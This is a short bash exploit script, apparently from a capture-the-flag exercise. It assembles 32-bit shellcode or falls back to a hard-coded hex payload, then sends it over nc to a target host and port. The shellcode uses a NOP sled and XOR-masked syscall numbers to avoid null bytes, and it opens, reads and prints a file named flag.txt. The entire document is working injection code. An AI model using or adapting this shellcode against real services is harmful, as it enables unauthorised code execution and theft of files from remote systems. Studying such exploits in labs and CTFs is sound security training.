#!/bin/bash

HOST=$1
PORT=$2

gcc shellcode1.s -m32 -c -o shellcode.bin

if [ $? -eq 0 ];then
  objcopy -O binary shellcode.bin out.bin
  cat out.bin | nc "$HOST" "$PORT"
else
  python2 -c 'print
  "\x90\x90\x90\x90\x90\x90\x31\xc0\x50\xb8\x15\x11\x11\x11\x35\x10\x11\x11\x11\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x54\x5b\x31\xc9\xcd\x80\x83\xec\x40\x89\xc3\x89\xe1\xba\x41\x11\x11\x11\x81\xf2\x01\x11\x11\x11\xb8\x13\x11\x11\x11\x35\x10\x11\x11\x11\xcd\x80\x89\xc2\xb8\x14\x11\x11\x11\x35\x10\x11\x11\x11\xbb\x11\x11\x11\x11\x81\xf3\x10\x11\x11\x11\xcd\x80\x90\x90\x90\x90"' | nc "$HOST" "$PORT"
fi
